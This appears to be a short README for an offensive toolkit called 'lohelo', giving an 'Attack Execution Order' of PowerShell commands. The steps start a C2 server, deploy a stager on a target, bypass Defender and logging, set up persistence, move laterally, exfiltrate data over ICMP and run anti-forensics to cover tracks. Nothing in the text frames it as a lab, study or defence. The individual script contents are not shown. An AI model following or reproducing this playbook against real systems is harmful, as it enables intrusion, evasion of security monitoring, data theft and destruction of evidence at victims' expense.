# lohelo

Attack Execution Order

1️⃣ Start the C2 Server
python c2_server.py

2️⃣ Deploy stager.ps1 on Target
powershell -ExecutionPolicy Bypass -NoProfile -File stager.ps1

3️⃣ Bypass Defender & Logs
powershell -ExecutionPolicy Bypass -NoProfile -File bypass.ps1

4️⃣ Establish Persistence
powershell -ExecutionPolicy Bypass -NoProfile -File persist.ps1

5️⃣ Move Laterally
powershell -ExecutionPolicy Bypass -NoProfile -File lateral.ps1

6️⃣ Exfiltrate Data
powershell -ExecutionPolicy Bypass -NoProfile -File exfil_icmp.ps1

7️⃣ Cover Tracks
powershell -ExecutionPolicy Bypass -NoProfile -File antiforensics.ps1
